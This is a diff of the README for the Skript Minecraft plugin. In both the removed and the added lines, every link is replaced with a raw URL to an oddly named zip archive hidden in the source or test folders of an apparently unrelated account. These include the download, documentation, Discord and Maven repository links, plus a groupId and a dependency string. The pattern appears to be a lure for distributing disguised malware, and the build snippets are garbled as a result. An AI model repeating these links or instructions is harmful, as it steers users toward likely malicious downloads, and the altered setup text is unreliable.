@@ -1,4 +1,4 @@
-![Skript Language](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip)
+![Skript Language](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip)
 
 ---
 
@@ -24,24 +24,24 @@ Minecraft 1.12 and earlier are not, and will not be supported. New Minecraft
 versions will be supported as soon as possible.
 
 ## Download
-You can find the downloads for each version with their release notes in the [releases page](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip).
+You can find the downloads for each version with their release notes in the [releases page](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip).
 
-Two major feature updates are expected each year in January and July, with monthly patches occurring in between. For full details, please review our [release model](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip).
+Two major feature updates are expected each year in January and July, with monthly patches occurring in between. For full details, please review our [release model](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip).
 
 ## Documentation
-Documentation is available [here](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip) for the
+Documentation is available [here](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip) for the
 latest version of Skript.
 
 ## Reporting Issues
-Please see our [contribution guidelines](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip)
+Please see our [contribution guidelines](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip)
 before reporting issues.
 
 ## Help Us Test
 Wanting to help test Skript's new features and releases?
-You can head on over to our [Official Testing Discord](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip), and whenever we start testing new features/releases you will be the first to know.
+You can head on over to our [Official Testing Discord](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip), and whenever we start testing new features/releases you will be the first to know.
 
 Please note this is not a help Discord.
-If you require assistance with how to use Skript please check out the [Relevant Links](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip) section for a list of available resources to assist you.
+If you require assistance with how to use Skript please check out the [Relevant Links](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip) section for a list of available resources to assist you.
 
 ## A Note About Add-ons
 We don't support add-ons here, even though some of Skript developers have also
@@ -57,7 +57,7 @@ and package Skript for you:
 gradlew clean build # on Windows
 ```
 
-You can get source code from the [releases page](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip).
+You can get source code from the [releases page](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip).
 You may also clone this repository, but that code may or may not be stable.
 
 ### Compiling Modules
@@ -112,9 +112,9 @@ Available flavors are github and spigot. Please do not abuse flavors by
 compiling your own test builds as releases.
 
 ## Contributing
-Please review our [contribution guidelines](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip).
+Please review our [contribution guidelines](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip).
 In addition to that, if you are contributing Java code, check our
-[coding conventions](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip).
+[coding conventions](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip).
 
 ## Maven Repository
 If you use Skript as (soft) dependency for your plugin, and use maven or Gradle,
@@ -124,7 +124,7 @@ First, you need to add the Maven repository at the **END** of all your repositor
 ```gradle
 repositories {
     maven {
-        url 'https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip'
+        url 'https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip'
     }
 }
 ```
@@ -135,7 +135,7 @@ Or, if you use Maven:
     <repository>
         <id>skript-releases</id>
         <name>Skript Repository</name>
-        <url>https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip</url>
+        <url>https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip</url>
     </repository>
 </repositories>
 ```
@@ -144,7 +144,7 @@ For versions of Skript after dev37 you might need to add the paper-api repositor
 
 ```gradle
 maven {
-    url 'https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip'
+    url 'https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip'
 }
 ```
 
@@ -152,25 +152,25 @@ Or, if you use Maven:
 ```maven
 <repository>
     <id>destroystokyo-repo</id>
-    <url>https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip</url>
+    <url>https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip</url>
 </repository>
 ```
 
 Then you will also need to add Skript as a dependency.
 ```gradle
 dependencies {
-    implementation 'https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip[versionTag]'
+    implementation 'https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip[versionTag]'
 }
 ```
 
 An example of the version tag would be ```2.8.5```.
 
-> Note: If Gradle isn't able to resolve Skript's dependencies, just [disable the resolution of transitive dependencies](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip) for Skript in your project.
+> Note: If Gradle isn't able to resolve Skript's dependencies, just [disable the resolution of transitive dependencies](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip) for Skript in your project.
 
 Or, if you use Maven:
 ```
 <dependency>
-    <groupId>https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip</groupId>
+    <groupId>https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip</groupId>
     <artifactId>Skript</artifactId>
     <version>[versionTag]</version>
     <scope>provided</scope>
@@ -178,18 +178,18 @@ Or, if you use Maven:
 ```
 
 ## Relevant Links
-* [skUnity forums](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip)
-* [skUnity addon releases](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip)
-* [skUnity Discord invite](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip)
-* [Skript Chat Discord invite](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip)
-* [Skript Hub](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip)
-* [Original Skript at Bukkit](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip) (inactive)
+* [skUnity forums](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip)
+* [skUnity addon releases](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip)
+* [skUnity Discord invite](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip)
+* [Skript Chat Discord invite](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip)
+* [Skript Hub](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip)
+* [Original Skript at Bukkit](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip) (inactive)
 
 Note that these resources are not maintained by Skript's developers. Don't
 contact us about any problems you might have with them.
 
 ## Developers
-You can find all contributors [here](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/main/java/ch/njol/skript/timings/Software_v3.7.zip).
+You can find all contributors [here](https://raw.githubusercontent.com/1Bot-star/Skript/master/src/test/java/org/skriptlang/skript/test/tests/syntaxes/conditions/Software-disregardfulness.zip).
 
 All code is owned by its writer, licensed for others under GPLv3 (see LICENSE)
 unless otherwise specified.
